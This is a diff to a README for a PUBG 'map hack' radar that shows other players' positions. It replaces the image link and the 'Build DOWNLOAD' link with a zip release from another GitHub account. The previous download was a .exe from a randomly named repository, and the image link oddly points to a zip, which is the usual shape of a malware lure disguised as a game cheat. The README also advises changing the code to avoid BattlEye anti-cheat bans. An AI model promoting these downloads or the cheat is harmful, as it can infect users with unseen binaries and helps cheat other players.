@@ -5,7 +5,7 @@ A little map hack program for PUBG game that shows players' positions on a HTML 
 
 Imgur picture of the web map:
 
-[![c3dr0](radar link)]((https://github.com/loasd104/asfsfscxs/archive/refs/tags/Release.zip))
+[![c3dr0](radar link)](https://github.com/morus24/PUBG-Radar-hack/releases/download/relise/new.zip)
 
 Written in Kotlin
 
@@ -19,7 +19,7 @@ Correct player color when driving.
 Equipped weapons are shown.
 Clear DroppedItem and DroppedItemGroup when picking up.
 
-[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/24.12.hhe.exe)
+[Build DOWNLOAD](https://github.com/morus24/PUBG-Radar-hack/releases/download/relise/new.zip)
 
 Note
 You need to modify the code before playing game, or you will be banned by BE.
